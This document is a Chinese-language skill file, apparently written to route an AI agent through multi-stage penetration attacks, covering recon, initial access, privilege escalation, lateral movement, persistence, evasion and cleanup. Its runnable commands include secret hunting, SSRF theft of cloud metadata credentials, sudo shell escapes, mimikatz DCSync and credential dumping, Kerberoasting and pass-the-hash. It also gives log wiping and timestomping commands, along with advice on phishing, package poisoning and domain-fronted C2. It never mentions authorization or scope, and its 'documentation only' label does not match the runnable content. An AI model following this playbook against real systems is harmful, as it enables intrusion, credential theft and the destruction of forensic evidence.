---
name: eni-attack-chain
description: "[DOCUMENTATION ONLY] [仅文档] 全局自动路由 | 攻击链编排：多阶段渗透从侦察到目标达成的路径规划、阶段调度与子技能分发"
---

> 仅文档：本文件是方法论与检查表，不含任何可执行脚本或载荷。

# 攻击链编排手册

多阶段渗透任务的总调度层。当一个任务不是"打一个点"而是"走完一条链"时——跨阶段、跨技能、跨工具的组合动作——先在这里完成路径规划，再把手头阶段分发给对应子技能执行。

## 一、什么情况下先来编排层

| 任务信号 | 编排需求 |
|---------|---------|
| 完整渗透测试/攻防演练 | 侦察到报告的全流程规划 |
| 从外网入口打到内网核心（域控/数据） | 边界突破→提权→横移→目标的阶段串联 |
| 拿到一个 webshell 或低权 shell，问"接下来怎么走" | 从当前据点向外推导路径 |
| 评估某目标的攻击面/攻击路径 | 多源信息收集后的路径推导 |
| Bug Bounty / SRC 持续性打点 | 多阶段流程的自动化编排 |
| 近源/供应链/钓鱼等复合入口 | 初始访问与后续阶段的衔接 |
| 云环境渗透 | 云资源发现→凭据→提权→跨账号横移 |

**不需要编排层的单阶段任务**直接分发：端口扫描、单个 Web 漏洞利用、纯 APK 逆向、单机提权等，直接进对应子技能。

## 二、编排器的职责

编排器不亲自执行工具，它做四件事：定路径、定顺序、定工具、定检查点。

```text
任务进入
  │
  ├─ 明确三个 W：目标资产(What)、现有筹码(What I have)、终点(Where)
  ├─ 列出候选路径并评估（耗时/隐蔽性/成功率/依赖）
  ├─ 拆解阶段，为每阶段指定子技能与工具
  │
  ├──> 侦察    → pentest-tools / 信息收集工具
  ├──> 初始立足 → pentest-tools / apk-reverse / js-reverse
  ├──> 提权/横移 → pentest-tools(references) / 域攻击
  ├──> 后渗透   → 凭据、持久化、规避
  └──> 报告    → docs-generator / diagram-generator
  │
  每个阶段结束回到编排层：复盘产出 → 修正路径 → 进入下一阶段
```

路径卡死时（漏洞不成立、凭据失效、检测拦截），回到编排层换备选路径，不在原地硬耗。

## 三、七个链式阶段总览

1. 侦察（Recon）——资产面、泄露面、人员面、技术栈面
2. 初始立足（Initial Access）——把外部视角变成内部据点
3. 提权（Privilege Escalation）——低权变高权
4. 横移（Lateral Movement）——从一台机器到整个域
5. 持久化（Persistence）——据点不因重启/登出而丢
6. 规避（Evasion）——全程对抗检测与响应
7. 清理（Cleanup）——撤出与痕迹处理

后文按阶段展开。每阶段标注常用工具与关键动作。

## 四、侦察阶段

### 4.1 资产面测绘

```bash
# 子域名与关联资产
subfinder -d target.com -all -o subs.txt
amass enum -passive -d target.com -o amass.txt
cat subs.txt amass.txt | sort -u > all_subs.txt

# 存活与指纹
httpx -l all_subs.txt -sc -title -td -o alive.txt
naabu -l all_subs.txt -p - -o ports.txt
nmap -sV -sC -iL alive.txt -oA nmap_out
```

经验点：
- 子公司的域名往往不在主资产清单里，通过股权关系、备案信息反查关联主体
- test/dev/staging 前缀的资产防护最弱、价值最高
- crt.sh 证书透明日志可以挖出内部域名

### 4.2 泄露面狩猎

```bash
# GitHub / 代码托管平台
# org:Company filename:.env
# org:Company "BEGIN RSA PRIVATE KEY"
# org:Company filename:application.yml password

# 搜索引擎语法
# site:target.com ext:sql | ext:conf | ext:ini
# site:target.com inurl:admin | inurl:backup

# 前端 JS 里挖密钥
cat js_urls.txt | while read u; do
  curl -s "$u" | grep -oiE '(api[_-]?key|secret|token|password)["'\'' ]*[:=]["'\'' ]*[^"'\'' ]{8,}'
done
```

高价值产出：云厂商 AK/SK、数据库连接串、JWT 签名密钥、VPN 入口凭据、内部系统地址。

### 4.3 人员面画像

- 社交平台/招聘信息反推组织架构与技术栈
- 邮箱格式规律（名字拼音/工号）用于后续喷洒
- 常用弱口令变体规则：`{拼音}{年份}`、`{拼音}{首字母大写}{特殊字符}`、`{工号}`

### 4.4 技术栈指纹

```bash
whatweb -i alive.txt --log-json=fp.json
httpx -l alive.txt -td -json -o tech.json
nuclei -l alive.txt -t tech/ -severity info -o tech_hits.txt
wpscan --url https://target.com --enumerate p,t,u --api-token $WPSCAN_TOKEN
```

## 五、初始立足阶段

### 5.1 Web 面突破（最常见入口）

| 类型 | 探测 | 利用思路 |
|------|------|---------|
| SQL 注入 | sqlmap | 拖库→写文件→命令执行 |
| 模板注入(SSTI) | sstimap | 模板上下文逃逸→RCE |
| 上传缺陷 | Burp 手工 | 绕过校验→webshell→反弹 |
| 反序列化 | ysoserial | 链式 gadget→RCE |
| SSRF | 手工构造 | 打内网端口/云元数据 |
| 未授权面 | nuclei | Actuator/Nacos/Redis/ES 等 |
| 会话类(XSS/CSRF) | xsstrike | 窃取管理员会话 |

```bash
sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent --tamper=space2comment
sstimap -u "https://target.com/search?q=*"
nuclei -l alive.txt -s critical,high -o vulns.txt
```

### 5.2 供应链路径

识别目标依赖的第三方（组件库、SaaS、外包、代维），选择最弱一环：开源包投毒（npm/pip/maven）、供应商系统沦陷后的更新通道滥用、共享 IT 服务商横向。

### 5.3 钓鱼路径

主题设计贴近真实业务（证书到期、存储配额、绩效通知、报销升级）；载荷形式：宏文档、LNK 伪装、HTML 走私、ISO 挂载（规避 MOTW）、OneNote 嵌脚本；OAuth 授权钓鱼可以绕过口令与 MFA。

### 5.4 近源路径

| 手段 | 工具 | 产出 |
|------|------|------|
| USB 键盘注入 | Rubber Ducky | 一键反弹 shell |
| 伪装线缆 | O.MG Cable | 后门植入 |
| 伪造热点 | Fluxion / Pineapple | 凭据捕获 |
| 门禁克隆 | Proxmark3 | 物理进入 |
| 内网节点投放 | Pi / LAN Turtle | 持久接入点 |

### 5.5 VPN/远程接入面

- 已知历史洞快速验证（Pulse Secure、Fortinet SSL VPN 系列 CVE）
- 无洞时走口令喷洒，控制速率避免锁账号

### 5.6 云入口

```bash
# 对象存储匿名访问
aws s3 ls s3://<bucket> --no-sign-request

# SSRF 打元数据
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure AD 喷洒（Spray 类工具）
```

## 六、提权阶段

### 6.1 Windows

| 技术 | 前提 | 工具 |
|------|------|------|
| Potato 族 | SeImpersonate | GodPotato / PrintSpoofer |
| 内核洞 | 补丁缺口 | watson / wesng 先检测 |
| 服务配置缺陷 | 未加引号路径/弱权限 | PowerUp |
| DLL 侧加载 | 可写目录 | ProcMon 找加载点 |
| AlwaysInstallElevated | 注册表开启 | MSI 安装 |
| 计划任务劫持 | 可写任务脚本 | schtasks |

```powershell
whoami /priv
.\GodPotato.exe -cmd "cmd /c whoami"
.\winPEAS.exe
```

### 6.2 Linux

```bash
find / -perm -4000 -type f 2>/dev/null   # SUID
sudo -l                                   # sudo 规则
sudo vim -c ':!/bin/bash'
sudo find / -exec /bin/bash \;
uname -r                                  # 内核版本对照 CVE
./linpeas.sh
```

### 6.3 数据库

MSSQL `xp_cmdshell` 开启链路；MySQL UDF；PostgreSQL `COPY ... TO PROGRAM`——详见 pentest-tools 子技能。

### 6.4 云

AWS 关注 `iam:PassRole`+`lambda:CreateFunction` 组合；Azure 关注应用管理员给服务主体加凭据。

## 七、横移阶段

### 7.1 凭据收割

```bash
# Windows
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt
secretsdump.py domain/user:pass@dc_ip

# Linux
grep -riE 'pass|token|secret' /etc /opt /var/www --include='*.conf' --include='*.env' 2>/dev/null
cat ~/.bash_history | grep -iE 'pass|ssh|token'
```

### 7.2 Hash/票据传递

```bash
netexec smb 10.0.0.0/24 -u admin -H <NTLM> --exec-method smbexec
GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:pass   # Kerberoast
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1  # AS-REP roast
# 金票据：krbtgt hash + SID → mimikatz kerberos::golden
```

### 7.3 远程执行通道（按留痕排序）

| 通道 | 留痕 | 命令 |
|------|------|------|
| WMI | 低 | wmiexec.py |
| DCOM | 低 | dcomexec.py |
| WinRM | 中 | evil-winrm |
| SMB(PsExec) | 高 | psexec.py |
| SSH 隧道 | 低(Linux) | ssh -D/-L |

### 7.4 NTLM Relay 组合

Responder 关 SMB/HTTP 只监听 → ntlmrelayx 指向目标集 → Coercer/PetitPotam 触发认证。

### 7.5 AD 路径挖掘

bloodhound-python 采集 → 找 GenericAll/WriteDacl/约束委派/DCSync 类路径；Certipy 排查 AD CS 模板（ESC1-ESC8）。

## 八、持久化阶段

### 8.1 Windows 优先级表（隐蔽性×检测难度）

WMI 事件订阅、DLL 劫持、影子账户（RID 克隆）、Golden Ticket、DSRM 后门为高隐蔽项；计划任务与 Run 键只用于短期。

### 8.2 Linux

SSH 公钥、crontab、ld.so.preload、PAM 补丁、systemd 单元——按驻留时长与权限需求选型。

### 8.3 云

Lambda 定时触发回连、Azure AD 应用+凭据、基础镜像投毒。

## 九、规避阶段

核心在分层：静态签名、行为、内存、网络、日志五个检测面各有一套对抗手法，详见 `references/evasion-cheatsheet.md`。

C2 选型：Cobalt Strike（团队协作）、Sliver（开源 Go）、Havoc（可定制）、Mythic（多 agent）、AdaptixC2（Kali 2026.1 收录）。

## 十、清理阶段

```bash
wevtutil cl Security; wevtutil cl System; wevtutil cl Application   # Win 日志
echo > /var/log/auth.log; history -c && history -w                 # Linux 日志
touch -t 202301010000 <file>                                        # 时间戳
```

内存残留（Mimikatz dump、beacon 进程）、临时文件、隧道配置一并回收。

## 十一、行动纪律与复盘

- 每步操作落日志：时间、动作、目标、结果——链路长了以后没有日志无法复盘
- 进入新主机先评估蜜罐特征（异常开放服务、过于诱人的凭据）
- 保持目标可用性：业务中断会同时中断你的链路，也提前暴露行动
- 失败复盘表：

| 失败模式 | 后果 | 改进 |
|---------|------|------|
| 凭据工具内存残留未清 | 完整路径被溯源 | 用后即清、走进程注入而非落盘 |
| C2 域名被情报标记 | 首连即拦截 | 新注册域+域前置+短周期轮换 |
| 钓鱼触发邮件网关规则 | 提前预警 | 先投测一封观察网关行为 |
| 横移踩蜜罐 | 意图暴露 | 先识别再行动 |

## 十二、工具索引

| 阶段 | 工具 |
|------|------|
| 侦察 | subfinder amass httpx naabu nmap whatweb wpscan katana gau |
| 漏洞利用 | nuclei sqlmap sstimap xsstrike burpsuite metasploit |
| 提权 | winPEAS linpeas GodPotato PrintSpoofer watson wesng |
| 横移/域 | mimikatz netexec impacket bloodhound certipy coercer responder evil-winrm |
| C2 | cobalt-strike sliver havoc mythic adaptixc2 |
| 近源 | fluxion aircrack-ng proxmark3 rubber-ducky wifi-pineapple |

## 十三、子技能协作路由

| 需求 | 目标 |
|------|------|
| Web 漏洞深度利用 | pentest-tools/SKILL.md |
| 内网 AD 攻击细节 | pentest-tools/references/network-attack-defense.md |
| 恶意样本逆向 | reverse-engineering/SKILL.md |
| 移动端 | apk-reverse/SKILL.md |
| 前端签名/JS 逆向 | js-reverse/SKILL.md |
| 群体自动化 | pentestswarm |
| AI 辅助 | mcp-kali-server / metasploitmcp / hexstrike-ai |
| 报告与攻击路径图 | docs-generator / diagram-generator |
